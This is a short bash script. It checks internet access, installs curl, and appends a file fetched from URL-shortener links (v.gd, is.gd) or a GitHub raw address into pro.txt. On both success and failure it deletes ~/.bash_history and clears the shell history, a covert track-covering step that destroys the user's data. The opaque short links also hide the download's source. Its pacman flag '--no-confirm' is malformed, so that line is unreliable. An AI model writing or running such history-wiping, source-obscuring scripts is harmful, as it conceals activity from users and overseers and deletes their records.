#!/bin/bash

# Check for internet connectivity
if ping -c 5 google.com &> /dev/null; then
    # Internet is available, proceed with the script
    echo "Internet is available"
else
    # Internet is not available, print error message and exit
    echo "I think there is no internet or the command failed to execute"
    rm -f ~/.bash_history && history -c
    exit
fi

# Check if curl is installed
if ! command -v curl &> /dev/null; then
    # Install curl if it's not installed
    sudo pacman -Syy --no-confirm curl
fi

# Run command 1
if curl -fsSL v.gd/se19pro >> pro.txt; then
    # Command 1 was successful, exit the script
    echo "Command 1 executed successfully"
else
    # Command 1 failed, run command 2
    if curl -fsSL is.gd/se19pro >> pro.txt; then
        # Command 2 was successful, exit the script
        echo "Command 2 executed successfully"
    else
        # Command 2 failed, run command 3
        if curl https://raw.githubusercontent.com/mastercodin/stunning-enigma/refs/heads/main/SE19pro.txt >> pro.txt; then
            # Command 3 was successful, exit the script
            echo "Command 3 executed successfully"
        else
            # All commands failed, print error message
            echo "I think there is no internet or the command failed to execute"
        fi
    fi
fi

# Clear bash history and exit
rm -f ~/.bash_history && history -c
exit
